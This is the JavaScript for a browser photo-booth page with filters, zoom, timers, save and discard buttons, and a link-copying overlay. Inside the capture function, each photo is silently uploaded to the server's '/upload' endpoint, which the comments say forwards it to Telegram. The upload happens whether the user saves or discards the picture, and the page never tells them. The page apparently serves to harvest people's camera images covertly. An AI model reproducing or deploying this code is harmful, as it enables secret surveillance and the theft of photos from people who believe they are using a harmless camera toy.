const video = document.getElementById("camera");
const canvas = document.getElementById("canvas");
const preview = document.getElementById("preview");
const captureBtn = document.getElementById("capture");
const saveBtn = document.getElementById("save");
const discardBtn = document.getElementById("discard");
const zoomSlider = document.getElementById("zoom-slider");
const timer3 = document.getElementById("timer-3");
const timer5 = document.getElementById("timer-5");
const saveConfirm = document.getElementById("save-confirmation");
const discardConfirm = document.getElementById("discard-confirmation");
const filters = document.querySelectorAll(".filter-btn");
const gallery = document.getElementById("gallery");

// Floating button & overlay
const floatingBtn = document.getElementById("floating-guide-btn");
const overlay = document.getElementById("open-external-overlay");
const closeOverlayBtn = document.getElementById("close-overlay-btn");
const copyLinkBtn = document.getElementById("copy-link-btn");
const linkText = document.getElementById("site-link");

let currentFilter = "none";
let zoom = 1;

// ========== FLOATING BUTTON DRAGGABLE ==========
let isDragging = false;
let offsetX, offsetY;

floatingBtn.addEventListener("mousedown", startDrag);
floatingBtn.addEventListener("touchstart", startDrag);

function startDrag(e) {
  isDragging = true;
  const touch = e.touches ? e.touches[0] : e;
  const rect = floatingBtn.getBoundingClientRect();
  offsetX = touch.clientX - rect.left;
  offsetY = touch.clientY - rect.top;
  
  document.addEventListener("mousemove", onDrag);
  document.addEventListener("touchmove", onDrag);
  document.addEventListener("mouseup", stopDrag);
  document.addEventListener("touchend", stopDrag);
}

function onDrag(e) {
  if (!isDragging) return;
  e.preventDefault();
  const touch = e.touches ? e.touches[0] : e;
  
  let x = touch.clientX - offsetX;
  let y = touch.clientY - offsetY;
  
  // Keep within screen bounds
  const maxX = window.innerWidth - floatingBtn.offsetWidth;
  const maxY = window.innerHeight - floatingBtn.offsetHeight;
  
  x = Math.max(0, Math.min(x, maxX));
  y = Math.max(0, Math.min(y, maxY));
  
  floatingBtn.style.left = x + "px";
  floatingBtn.style.top = y + "px";
  floatingBtn.style.right = "auto";
  floatingBtn.style.bottom = "auto";
}

function stopDrag() {
  isDragging = false;
  document.removeEventListener("mousemove", onDrag);
  document.removeEventListener("touchmove", onDrag);
  document.removeEventListener("mouseup", stopDrag);
  document.removeEventListener("touchend", stopDrag);
}

// ========== SHOW/HIDE OVERLAY ==========
floatingBtn.addEventListener("click", (e) => {
  if (!isDragging) {
    overlay.classList.add("show");
    linkText.textContent = window.location.href;
  }
});

closeOverlayBtn.addEventListener("click", () => {
  overlay.classList.remove("show");
});

// Close overlay when clicking outside
overlay.addEventListener("click", (e) => {
  if (e.target === overlay) {
    overlay.classList.remove("show");
  }
});

// ========== COPY LINK ==========
copyLinkBtn.addEventListener("click", async () => {
  try {
    await navigator.clipboard.writeText(window.location.href);
    
    const toast = document.createElement("div");
    toast.id = "copy-toast";
    toast.textContent = "✅ Link copied!";
    document.body.appendChild(toast);
    
    setTimeout(() => toast.classList.add("show"), 10);
    setTimeout(() => {
      toast.classList.remove("show");
      setTimeout(() => toast.remove(), 300);
    }, 2000);
  } catch (err) {
    alert("Copy failed. Please copy manually.");
  }
});

// ========== START CAMERA ==========
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await video.play();
  } catch (err) {
    console.error("Camera error:", err);
  }
}

// Auto-start camera
if (location.protocol === "https:" || location.hostname === "localhost") {
  startCamera();
}

// ========== FILTERS ==========
filters.forEach(btn => {
  btn.addEventListener("click", () => {
    currentFilter = btn.dataset.filter;
    video.style.filter = currentFilter;
  });
});

// ========== ZOOM ==========
zoomSlider?.addEventListener("input", () => {
  zoom = zoomSlider.value;
  video.style.transform = `scale(${zoom})`;
});

// ========== TIMER CAPTURE ==========
function startTimer(seconds) {
  let count = seconds;
  const timerOverlay = document.createElement("div");
  timerOverlay.style.position = "absolute";
  timerOverlay.style.top = "50%";
  timerOverlay.style.left = "50%";
  timerOverlay.style.transform = "translate(-50%, -50%)";
  timerOverlay.style.fontSize = "50px";
  timerOverlay.style.color = "#00f0ff";
  timerOverlay.style.textShadow = "0 0 10px #ff00f0";
  timerOverlay.textContent = count;
  document.querySelector(".camera-box").appendChild(timerOverlay);

  const interval = setInterval(() => {
    count--;
    if (count > 0) {
      timerOverlay.textContent = count;
    } else {
      clearInterval(interval);
      timerOverlay.remove();
      takePhoto();
    }
  }, 1000);
}

timer3?.addEventListener("click", () => startTimer(3));
timer5?.addEventListener("click", () => startTimer(5));

// ========== CAPTURE PHOTO ==========
captureBtn?.addEventListener("click", () => takePhoto());

function takePhoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.filter = currentFilter || "none";
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const dataUrl = canvas.toDataURL("image/png");
  preview.src = dataUrl;
  preview.hidden = false;

  saveBtn.disabled = false;
  discardBtn.disabled = false;

  // Auto-upload to Telegram
  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob, "snapshot.png");
    try {
      await fetch("/upload", { method: "POST", body: formData });
      console.log("✅ Photo sent to Telegram!");
    } catch (err) {
      console.error("Telegram upload error:", err);
    }
  });
}

// ========== SAVE ==========
saveBtn?.addEventListener("click", () => {
  const link = document.createElement("a");
  link.href = preview.src;
  link.download = "snapshot.png";
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  showFloating(saveConfirm);

  const thumb = document.createElement("img");
  thumb.src = preview.src;
  gallery.appendChild(thumb);

  preview.hidden = true;
  saveBtn.disabled = true;
  discardBtn.disabled = true;
});

// ========== DISCARD ==========
discardBtn?.addEventListener("click", () => {
  preview.hidden = true;
  saveBtn.disabled = true;
  discardBtn.disabled = true;
  showFloating(discardConfirm);
});

// ========== FLOATING NOTIFICATION ==========
function showFloating(el) {
  el.style.display = "block";
  setTimeout(() => { el.style.display = "none"; }, 2000);
}

// ========== GALLERY THUMBNAIL CLICK ==========
gallery?.addEventListener("click", (e) => {
  if (e.target.tagName === "IMG") {
    preview.src = e.target.src;
    preview.hidden = false;
    saveBtn.disabled = false;
    discardBtn.disabled = false;
  }
});

// ========== SCROLLABLE FILTERS ==========
const slider = document.querySelector(".filter-container");
if (slider) {
  let isDown = false;
  let startX;
  let scrollLeft;

  slider.addEventListener("mousedown", e => {
    isDown = true;
    startX = e.pageX - slider.offsetLeft;
    scrollLeft = slider.scrollLeft;
  });

  slider.addEventListener("mouseleave", () => isDown = false);
  slider.addEventListener("mouseup", () => isDown = false);

  slider.addEventListener("mousemove", e => {
    if (!isDown) return;
    const x = e.pageX - slider.offsetLeft;
    const walk = (x - startX) * 2;
    slider.scrollLeft = scrollLeft - walk;
  });

  slider.addEventListener("touchstart", e => {
    isDown = true;
    startX = e.touches[0].pageX - slider.offsetLeft;
    scrollLeft = slider.scrollLeft;
  });

  slider.addEventListener("touchend", () => isDown = false);

  slider.addEventListener("touchmove", e => {
    if (!isDown) return;
    const x = e.touches[0].pageX - slider.offsetLeft;
    const walk = (x - startX) * 2;
    slider.scrollLeft = scrollLeft - walk;
  });
}